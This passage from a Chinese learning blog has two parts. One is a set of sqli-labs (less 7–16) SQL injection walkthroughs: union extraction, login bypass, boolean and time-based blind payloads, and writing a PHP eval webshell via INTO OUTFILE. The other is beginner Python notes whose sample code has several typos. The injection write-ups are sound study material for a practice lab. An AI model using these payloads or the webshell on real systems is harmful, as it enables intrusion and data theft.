+<p>事实也是这样，这里返回了账号密码和我们输入的不一样，但是我们知道我们成功登入了，注释符以前的內容是可执行的这样接下来就是类似less1的内容</p>
+<p>order by n 查看列数</p>
+<p>union select 1，2，。。n查看回显</p>
+<p>按照回显来嵌套</p>
+<p>select database();</p>
+<p>select schema_name from information_schema.schemata;</p>
+<p>select table_name from information_schema.tables where table_schema=’A’;</p>
+<p>select column_name from information_schema.column where table_name=’B’;</p>
+<p>select username,password from where A.B;</p>
+<p>利用group_concat()和concat_ws()来简便操作</p>
+<p><img src="https://i.loli.net/2021/11/07/wF5CMxKoJOG1NcV.png" alt="QQ截图20211107111426.png"></p>
+<h1 id="less-12"><a href="#less-12" class="headerlink" title="less 12"></a>less 12</h1><p>同理同法，不过是把单引号改为双引号单括号。</p>
+<p>测试注入可以依次测试’  ,  ‘)  ,  ‘))  ,  “  ,  “)  ,  “))六种</p>
+<h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>同样操作</p>
+<p>post data：uname=1’) or 1=1#&amp;passwd=1&amp;submit=Submit</p>
+<p>这次没有报错，但也没有回显</p>
+<p>属于布尔盲注</p>
+<p>post data：uname=1’) or length(database()&gt;1#&amp;passwd=1&amp;submit=Submit来判断数据库名长度</p>
+<p>post data：uname=1’) or left（（select schema_name from information_schema.schemata limit 0,1）,1）=’a’#&amp;passwd=1&amp;submit=Submit来判断列名</p>
+<p>PS：or左右两边其中一边为真都为真，已知左为假，所以只有有报错则右边为假就会报错，所以利用此来破解库名，表名，列名。</p>
+<p>利用工具进行爆破详见less5,6总结</p>
+<p>13     (‘’)</p>
+<p>14      “”</p>
+<p>15       ‘’</p>
+<p>16       (“”)</p>
+<p>less13,14,15,16同样的方法只是对数据的包裹方式不同。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/04/less7-8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/04/less7-8/" class="post-title-link" itemprop="url">less7-10</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-11-04 17:53:22 / 修改时间：18:13:04" itemprop="dateCreated datePublished" datetime="2021-11-04T17:53:22+08:00">2021-11-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="less7（一句话木马的利用）"><a href="#less7（一句话木马的利用）" class="headerlink" title="less7（一句话木马的利用）"></a>less7（一句话木马的利用）</h1><p>首先按部就班试出</p>
+<p>？id=1‘))–+</p>
+<p>利用order by查出数据库列数 </p>
+<p>提示是use outfile </p>
+<p>into outfile 是写文件的指令，资料<a target="_blank" rel="noopener" href="https://blog.csdn.net/cuiruidu3106/article/details/100439103?utm_source=app&app_version=4.17.2&code=app_1562916241&uLinkId=usr1mkqgl919blen">引用csdn的大佬</a></p>
+<p>利用union select 1,2,‘&lt;?php @eval($_post[“crow”]);？&gt;’ into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7\a.php”–+将一句话木马写入</p>
+<p><img src="https://i.loli.net/2021/11/04/xWTdpgA8jq5eXht.png" alt="QQ截图20211104171541.png"></p>
+<p>这里报错了没事，现在文件已经写到我们想要的地方</p>
+<p><img src="https://i.loli.net/2021/11/04/jZrFiNRp9PG4Az1.png" alt="QQ截图20211104173133.png"></p>
+<p>然后使用菜刀访问即可！</p>
+<p><img src="https://i.loli.net/2021/11/04/wWXQb2Tgo8EDuBJ.png" alt="QQ截图20211104171109.png"></p>
+<p>ps：操作前提该网站允许文件的读入操作，不然会一直报错且菜刀也访问不到文件。</p>
+<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><h2 id="方法一-布尔盲注"><a href="#方法一-布尔盲注" class="headerlink" title="方法一 布尔盲注"></a>方法一 布尔盲注</h2><p>输入？id=1‘判断存在注入错误</p>
+<p>输入？id=1’ order by 3–+ 当3改成4时报错说明只有4列</p>
+<p>输入？id=1‘and left（（database（）），1）=’s‘–+ 猜出第一位</p>
+<p>或者采用？id=1’‘and ascii（substr（（database（）），1,1））&gt;16</p>
+<p>或者输入？id=1’ and ascii((select schema_name from information_schema.schemata limit 1,1)1,1)&gt;17–+也可以回应，判断数据库名</p>
+<p>输入？id=1‘and acii（（select table_name from information_schema.tables where table_schema=’scurity’））&gt;115–+判断表名</p>
+<p>输入？id=1’and ascii（（select column_name from information_schema.columns where table_name=’user’））&gt;10–+判断表中字段。</p>
+<p>以上语句配合burpsuite进行使用（与lesson5,6同理）。</p>
+<h2 id="法二-时间盲注"><a href="#法二-时间盲注" class="headerlink" title="法二 时间盲注"></a>法二 时间盲注</h2><p>？id=1‘ and sleep（5）–+判断存在注入 如果可以会延迟5秒回应（对比可见延迟）</p>
+<p><img src="https://i.loli.net/2021/11/04/2d5OTQ68ZArtSMz.png" alt="QQ截图20211104174905.png"></p>
+<p><img src="https://i.loli.net/2021/11/04/xYsm5MioZyjcPFr.png" alt="QQ截图20211104175501.png"></p>
+<p>输入？id=1‘ and if(length(database())=8,1,sleep(5))–+如果为8则页面会较快的刷新，如果不为8则会延迟5秒刷新</p>
+<p>输入？id=1’ and if（ascii（substr（select database（），1,1））&gt;113,1,sleep(5))–+如果当前数据库的第一个字母的ascii值大于113的时候，会立刻返回结果，否则执行5秒</p>
+<h1 id="less-9和less-10"><a href="#less-9和less-10" class="headerlink" title="less 9和less 10"></a>less 9和less 10</h1><p>less9和less10中可以使用时间盲注但不可以使用布尔盲注，less10只是将单引号改成了双引号</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/28/python%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/10/28/python%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">python学习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-28 17:25:38" itemprop="dateCreated datePublished" datetime="2021-10-28T17:25:38+08:00">2021-10-28</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-03-02 11:46:00" itemprop="dateModified" datetime="2022-03-02T11:46:00+08:00">2022-03-02</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><p>python中，一切皆为对象。每个对象由：标识(identity),类型(type),值(value)组成。</p>
+<ol>
+<li>标识用于唯一标识对象，通常对应对象在计算机内存中的地址。使用内置函数id(obj)课返回对象obj的标识。</li>
+<li>类型用于表示对象存储的“数据”的类型。类型可以限制对象的取值范围以及可执行的操作。可以使用type(obj)获取对象的所属类型。</li>
+<li>值表示对象所存储的信息。使用print(obj)可以直接打印出值。</li>
+</ol>
+<h2 id="对象的本质就是：一个内存块，拥有特定值，支持特定类型的相关操作。"><a href="#对象的本质就是：一个内存块，拥有特定值，支持特定类型的相关操作。" class="headerlink" title="对象的本质就是：一个内存块，拥有特定值，支持特定类型的相关操作。"></a><strong>对象的本质就是：一个内存块，拥有特定值，支持特定类型的相关操作。</strong></h2><p><img src="https://i.loli.net/2021/10/29/nfyi6woT7tdk1OE.jpg" alt="Screenshot_20211029_095052_tv.danmaku.bili_edit_384246334166280.jpg"></p>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>在python中，变量也变成：对象的引用。因为，变量存储的就是对象的地址。变量通过地址引用了“对象”。</p>
+<p>变量位于：栈内存</p>
+<p>对象位于：堆内存</p>
+<h2 id="python-是动态类型语言"><a href="#python-是动态类型语言" class="headerlink" title="python 是动态类型语言"></a>python 是动态类型语言</h2><p>变量不需要显式类型。根据变量引用对象，python解释器自动确定数据类型。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="python-是强类型语言"><a href="#python-是强类型语言" class="headerlink" title="python 是强类型语言"></a>python 是强类型语言</h2><p>每个对象都有数据类型，只支持该类型支持的操作。</p>
+<h1 id="变量的声明和赋值"><a href="#变量的声明和赋值" class="headerlink" title="变量的声明和赋值"></a>变量的声明和赋值</h1><p>变量的声明和赋值用于将一个变量绑定到一个对象身上，格式如下：</p>
+<p>变量名=表达式</p>
+<p>最简单的表达式是字面量。比如：a=123。运行过程中，解释器先运行右边的表达式，生成一个代表表达式运算的结果的对象：然后，将这个对象地址赋值给左边的变量。 </p>
+<h1 id="删除变量和垃圾回收机制"><a href="#删除变量和垃圾回收机制" class="headerlink" title="删除变量和垃圾回收机制"></a>删除变量和垃圾回收机制</h1><p>可以通过del语句删除不在使用的变量。如果对象没有变量应用，就会被回收器回收，清空内存空间。(自动回收)</p>
+<p><img src="https://i.loli.net/2021/10/29/pG53Y6WohDCKwbq.jpg" alt="Screenshot_20211029_193403_tv.danmaku.bili_edit_384119715821328.jpg"></p>
+<h1 id="基本内置数据类型介绍"><a href="#基本内置数据类型介绍" class="headerlink" title="基本内置数据类型介绍"></a>基本内置数据类型介绍</h1><h2 id="整型（int）"><a href="#整型（int）" class="headerlink" title="整型（int）"></a>整型（int）</h2><p>整数，2345，python2中整数是32位    -2^63^—2^63^-1之间的数,python3中int可以存储任意大小的数，long被取消。python3中可以做超大数的计算，而不会造成数据溢出。</p>
+<h2 id="浮点型（float）"><a href="#浮点型（float）" class="headerlink" title="浮点型（float）"></a>浮点型（float）</h2><p>小数，314*e-2，浮点数在内存中也是按照科学计数法来存储的。</p>
+<h2 id="布尔型（bool）"><a href="#布尔型（bool）" class="headerlink" title="布尔型（bool）"></a>布尔型（bool）</h2><p>表示真假，仅包含true，false，python2中没有bool值，直接用0,1表示，python3中true和false被定义成了关键字，但他们的本质还是0和1，甚至可以和数字相加。</p>
+<img src="https://i.loli.net/2021/10/29/rNcEseDIGWid1Zv.png" alt="QQ截图20211029232434_1_.png" style="zoom:200%;" />
+
+<h2 id="字符串型（string）"><a href="#字符串型（string）" class="headerlink" title="字符串型（string）"></a>字符串型（string）</h2><p>由字符组成的序列</p>
+<p>python不支持单字符类型，单字符也是作为一个字符串使用的。</p>
+<p>python的字符串是不变的，我们无法对任意的原字符进行任意修改。但，可以将字符串的一部分复制到新创建的字符串当中，达到“看起来修改”的效果。</p>
+<h3 id="字符串的编码"><a href="#字符串的编码" class="headerlink" title="字符串的编码"></a>字符串的编码</h3><p>python3直接支持unicode，可以表示世界上的任何书面语言的字符。python3的字符默认就是16位unicode编码，ascii码是unicode编码的子集。</p>
+<p>使用内置函数ord()可以把字符转换成对应的unicode码；</p>
+<p>使用内置函数chr()可以把十进制数转换成对应的字符。</p>
+<img src="https://i.loli.net/2021/10/29/8RjPFz9iNJKVHso.png" alt="QQ截图20211029235713_1_.png" style="zoom:200%;" />
+
+<h3 id="引号创建字符串"><a href="#引号创建字符串" class="headerlink" title="引号创建字符串"></a>引号创建字符串</h3><p>可以通过单引号或双引号创建字符串。如：a=’abc’;b=’sxt’</p>
+<p>使用两种引号的好处是可以创建本身就包含的引号的字符串，而不使用转义字符。如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">&quot;I&#x27;m a teacher!&quot;</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> (a)</span><br><span class="line">&gt;&gt;&gt;b=<span class="string">&#x27;my_name is &quot;tom&quot;&#x27;</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> (b)</span><br></pre></td></tr></table></figure>
+
+<p>python 允许空字符的存在，不包含任何字符且长度为0</p>
+<p>用函数len()可以返回字符串的长度</p>
+<h3 id="转义字符串"><a href="#转义字符串" class="headerlink" title="转义字符串"></a>转义字符串</h3><p>使用“\+特殊符号“,来实现某些难以用字符表示的效果，比如换行等，常见的转义</p>
+<p><img src="https://i.loli.net/2021/10/30/IsWOnkX1jJPUE6B.png" alt="Screenshot_2021_1030_224611.png"></p>
+<p>例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">&#x27;I\nlove\nU&#x27;</span></span><br><span class="line">&gt;&gt;&gt;a</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符串的拼接"><a href="#字符串的拼接" class="headerlink" title="字符串的拼接"></a>字符串的拼接</h3><h4 id="可以使用-将多个字符串拼接起来。例如：’aa‘-’bb‘-》’aabb‘"><a href="#可以使用-将多个字符串拼接起来。例如：’aa‘-’bb‘-》’aabb‘" class="headerlink" title="可以使用+将多个字符串拼接起来。例如：’aa‘+’bb‘==》’aabb‘"></a>可以使用+将多个字符串拼接起来。例如：’aa‘+’bb‘==》’aabb‘</h4><ol>
+<li>如果+两边都是字符串，则拼接</li>
+<li>如果+两边都是数字，则加法运算</li>
+<li>如果+两边类型不同，则抛出异常</li>
+</ol>
+<h4 id="可以将多个字面字符串直接放在一起实现拼接。例如：’aa‘-’bb‘-》’aabb‘"><a href="#可以将多个字面字符串直接放在一起实现拼接。例如：’aa‘-’bb‘-》’aabb‘" class="headerlink" title="可以将多个字面字符串直接放在一起实现拼接。例如：’aa‘ ’bb‘==》’aabb‘"></a>可以将多个字面字符串直接放在一起实现拼接。例如：’aa‘ ’bb‘==》’aabb‘</h4><h3 id="字符串的复制"><a href="#字符串的复制" class="headerlink" title="字符串的复制"></a>字符串的复制</h3><p>使用*可以实现字符串的复制。</p>
+<p>例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">&#x27;wds5418&#x27;</span>*<span class="number">3</span></span><br><span class="line">&gt;&gt;&gt;a</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="不换行打印"><a href="#不换行打印" class="headerlink" title="不换行打印"></a>不换行打印</h3><p>调用print时，会自动打印一个换行符，若，我们不想换行，可以通过参数end=’任意字符串‘，实现末尾添加任何类容。</p>
+<h3 id="从控制台读取字符串"><a href="#从控制台读取字符串" class="headerlink" title="从控制台读取字符串"></a>从控制台读取字符串</h3><p>通过input（）从控制台读取键盘输入的内容。</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="链式赋值"><a href="#链式赋值" class="headerlink" title="链式赋值"></a>链式赋值</h2><p>链式赋值用于同一个对象赋值给多个变量。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=y=z //相当于：x=<span class="number">123</span>,y=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="系列解包式赋值"><a href="#系列解包式赋值" class="headerlink" title="系列解包式赋值"></a>系列解包式赋值</h2><p>系列数据赋值给对应相同个数的变量（个数必须保持一致）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b,c=<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> //相当于：a=<span class="number">4</span>;b=<span class="number">5</span>;c=<span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+<p>操作使用系列解包赋值实现变量交换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b=<span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b=b,a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a,b)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2021/10/29/2p5A4l3mwij1doR.png" alt="QQ截图20211029195620.png"></p>
+<p>这里对比C语言数值交换，不用多定义一个变量。</p>
+<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="https://i.loli.net/2021/10/29/OcVuU96jv84E2QH.png" alt="Screenshot_20211029_200514_tv.danmaku.bili.png"></p>
+<h2 id="类型转化和四舍五入"><a href="#类型转化和四舍五入" class="headerlink" title="类型转化和四舍五入"></a>类型转化和四舍五入</h2><ol>
+<li>类似于int(),可以使用float()将其他类型转化成浮点数。</li>
+<li>整数和浮点数混合运算时，表达式结果自动转型为浮点数。</li>
+<li>round()可以返回四舍五入的值。</li>
+</ol>
+<p>注：但是不会改变原有值，而是会产生新的值</p>
+<h2 id="增强型赋值运算符"><a href="#增强型赋值运算符" class="headerlink" title="增强型赋值运算符"></a>增强型赋值运算符</h2><p>运算符+，-，*，/，**和%和赋值符都可以构成“增强型赋值运算符”。</p>
+<p>a=a+1 等价于 a+=1</p>
+<p><img src="https://i.loli.net/2021/10/29/iqxbF1VHQophRgf.png" alt="Screenshot_20211029_203239_tv.danmaku.bili.png"></p>
+<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p><img src="https://i.loli.net/2021/10/29/uQAqxiZ58ajXLJv.png" alt="Screenshot_20211029_232906_tv.danmaku.bili.png"></p>
+<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p><img src="https://i.loli.net/2021/10/29/Ewh47uQTPF3DKOX.png" alt="Screenshot_20211029_233137_tv.danmaku.bili.png"></p>
+<h2 id="同一运算符"><a href="#同一运算符" class="headerlink" title="同一运算符"></a>同一运算符</h2><p><img src="https://i.loli.net/2021/10/29/sNFEwmDJfMC6akZ.png" alt="Screenshot_20211029_233336_tv.danmaku.bili.png"></p>
+<p>is与==区别：</p>
+<p>is用于判断两个变量引用对象是否为同一个，既对象的地址。</p>
+<p>==用于判断引用变量对象的值是否相等，默认调用对象的—eq—()方法</p>
+<p>ps：整数缓存问题：</p>
+<p>python 仅仅对比较小的整数进行缓存（范围为[-5,256]），而并非是所有的整数对象。需要注意的是，这仅仅是在 命令行中执行，而在pycham或者保存为文件执行，结果是不一样的，这是因为解释器做了一部分优化（范围[-5,任何正整数]）。</p>
+<h2 id="str（）实现数字转型字符串"><a href="#str（）实现数字转型字符串" class="headerlink" title="str（）实现数字转型字符串"></a>str（）实现数字转型字符串</h2><p>str()可以帮助我们将其他数据类型转换为字符串。例：</p>
+<p>str（5.20）==》’5.20‘</p>
+<p>当我们调用print（）函数时，解释器自动调用了str（）将非字符串的对象转化成了字符串。</p>
+<h2 id="使用-提取字符"><a href="#使用-提取字符" class="headerlink" title="使用[]提取字符"></a>使用[]提取字符</h2><p>字符串的本质是字符序列，通过在字符串后面添加[]，在[]里面指定偏移量，可以提取该位置的单个字符。</p>
+<h3 id="正向搜索"><a href="#正向搜索" class="headerlink" title="正向搜索"></a>正向搜索</h3><p>最左侧的第一个字符，偏移量为0，第二个偏移量为1，以此类推，直到len（str）-1为止</p>
+<h3 id="反向搜索："><a href="#反向搜索：" class="headerlink" title="反向搜索："></a>反向搜索：</h3><p>最右边第一字符，偏移量为-1，倒数第二个为-2，以此类推，直到-len（str）为止</p>
+<h2 id="replace-实现字符串替换"><a href="#replace-实现字符串替换" class="headerlink" title="replace()实现字符串替换"></a>replace()实现字符串替换</h2><p>字符串是“是不可变量”的，通过[]可以获取字符串指定位置的字符，但不能改变字符串，尝试改变字符串中的某个字符，就会报错。字符串虽然不可改变，但是，可以创建新的字符串来实现。</p>
+<p>replace（’字符‘，’新字符‘）返回值是一个新的字符串</p>
+<h2 id="字符串切片slice操作"><a href="#字符串切片slice操作" class="headerlink" title="字符串切片slice操作"></a>字符串切片slice操作</h2><p>可以快速地提取字符串，标准格式为：</p>
+<p>[起始偏移值start：终止偏移量end:步长step]  </p>
+<p>PS:默认包头不包尾;可以利用步长来跳取字符</p>
+<h2 id="spit（）分割和join（）合并"><a href="#spit（）分割和join（）合并" class="headerlink" title="spit（）分割和join（）合并"></a>spit（）分割和join（）合并</h2><p>spite（）可以基于指定分隔符将字符串分隔成多个子字符串（存储到列表中）。如果不指定分割符，则默认使用空白字符（换行符/空格/制表符）示例代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">&#x27;to be or not to be&#x27;</span></span><br><span class="line">&gt;&gt;&gt;a.spite（）</span><br><span class="line">[<span class="string">&#x27;to&#x27;</span>,<span class="string">&#x27;be&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;not&#x27;</span>,<span class="string">&#x27;to&#x27;</span>,<span class="string">&#x27;be&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;a.spite(be)</span><br><span class="line">[<span class="string">&#x27;to &#x27;</span>,<span class="string">&#x27;or not to &#x27;</span>,<span class="string">&#x27;&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>join()的作用正好相反，用于将一系列子字符串连接起来例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=[<span class="string">&#x27;sxt&#x27;</span>,<span class="string">&#x27;sxt100&#x27;</span>,<span class="string">&#x27;swt200&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;*&#x27;</span>,join(a)</span><br><span class="line"><span class="string">&#x27;sxt*sxt100*sxt200&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>拼接字符串的要点：</p>
+<p>使用字符串接符+，会生成新的字符串对象，因此不推荐使用+来拼接字符，推荐使用join（）函数，因为join函数在拼接语言字符串之前会计算所有字符的长度，然后逐一拷贝，仅新建一次对象。</p>
+<p>操作：测试品节符和join（），不同的效率</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time01=time.time() <span class="comment">#起始时间</span></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rang(<span class="number">10000</span>):</span><br><span class="line">	a+=<span class="string">&#x27;sxt&#x27;</span></span><br><span class="line">time02=time.time() <span class="comment">#终止时间</span></span><br><span class="line"><span class="built_in">print</span>(time02-time01)</span><br><span class="line">time03=time.time()<span class="comment">#起始时间</span></span><br><span class="line">li=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rang(<span class="number">10000</span>):</span><br><span class="line">    li.append(sxt)</span><br><span class="line">a=<span class="string">&#x27;&#x27;</span>,join(li)</span><br><span class="line">time04=time.time()<span class="comment">#终止时间</span></span><br><span class="line"><span class="built_in">print</span>（time03-time04）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="字符串驻留机制和字符串同一性判定"><a href="#字符串驻留机制和字符串同一性判定" class="headerlink" title="字符串驻留机制和字符串同一性判定"></a>字符串驻留机制和字符串同一性判定</h2><p>字符串驻留：仅保存一份相同且不可变的字符串的方法，不同的值域被存放在字符串驻留池。python支持字符串驻留机制，对于符合标识符规则的字符串（仅包含下划线（_）,字母和数字会启用字符串驻留机制。</p>
+<h2 id="常用的查找方法"><a href="#常用的查找方法" class="headerlink" title="常用的查找方法"></a>常用的查找方法</h2><p><img src="https://i.loli.net/2021/10/31/NuiZ1PecKJ49UtQ.png" alt="Screenshot_20211031_093328_tv.danmaku.bili.png"></p>
+<p><img src="https://i.loli.net/2021/10/31/Frt16LS3lsWo2EJ.png" alt="Screenshot_20211031_093955_tv.danmaku.bili.png"></p>
+<h2 id="去除首尾信息"><a href="#去除首尾信息" class="headerlink" title="去除首尾信息"></a>去除首尾信息</h2><p>通过strip（）去处字符串首尾指定信息。通过istrip（）去除左边指定信息，rstrip（）去除字符串右边指定信息。</p>
+<h2 id="大小写的转换"><a href="#大小写的转换" class="headerlink" title="大小写的转换"></a>大小写的转换</h2><p><img src="https://i.loli.net/2021/10/31/v1uT2NpasLxMQKD.png" alt="Screenshot_20211031_094634_tv.danmaku.bili.png"></p>
+<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><ol>
+<li>isalnum（）是否都为字母和数字</li>
+<li>isalpha（）检测字符串是否只由字母组成（含汉字）</li>
+<li>isdigit（）检查字符串是否只由数字组成</li>
+<li>isspace（）检测是否为空白符</li>
+<li>isupper（）是否为大写字母</li>
+<li>islower（）是否为小写字母</li>
+</ol>
+<h2 id="字符串的格式化"><a href="#字符串的格式化" class="headerlink" title="字符串的格式化"></a>字符串的格式化</h2><p>python2.6开始，新增了一种格式化字符串的函数 str.format(),它增强了字符串格式化的功能。</p>
+<p>基本语法是通过{}和：来替代以前的%</p>
+<p>format函数可以接受不限个参数，位置可以不安顺序。</p>
+<p><img src="https://i.loli.net/2021/10/31/qzAPc9pVS2oFeJU.png" alt="QQ截图20211031101849.png"></p>
+<h2 id="填充与对齐"><a href="#填充与对齐" class="headerlink" title="填充与对齐"></a>填充与对齐</h2><p>填充和对齐一起使用^,&lt;,&gt;分别是居中，左对齐，右对齐，后面带宽度</p>
+<p>：号后面带填充的字符，只能是一个字符，不指定的话默认是用空格填充</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&quot;&#123;:*&gt;8&#125;&quot;</span>.frmat(<span class="string">&quot;245&quot;</span>)</span><br><span class="line"><span class="string">&#x27;*****245&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="数字的格式化"><a href="#数字的格式化" class="headerlink" title="数字的格式化"></a>数字的格式化</h2><p><img src="https://i.loli.net/2021/10/31/9UCYOGm4dMoxehH.png" alt="Screenshot_20211031_103425_tv.danmaku.bili.png"></p>
+<h1 id="时间的表示"><a href="#时间的表示" class="headerlink" title="时间的表示"></a>时间的表示</h1><p>计算机中时间的表示是从“1970年1月1日 00:00:00”开始的，以毫秒（1/1000秒）进行计算的。我们也把1970年这个时刻记为“unix时间点”。</p>
+<p>这样，我们就把时间全部用数字表示了。</p>
+<p><img src="https://i.loli.net/2021/10/29/7xdYnAcwfOSB4D2.png" alt="Screenshot_20211029_203817_tv.danmaku.bili.png"></p>
+<p>python 中可以通过time.time()获取当前时刻，返回的值是以秒为单位，带微秒(1/1000毫秒)精度的浮点数。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
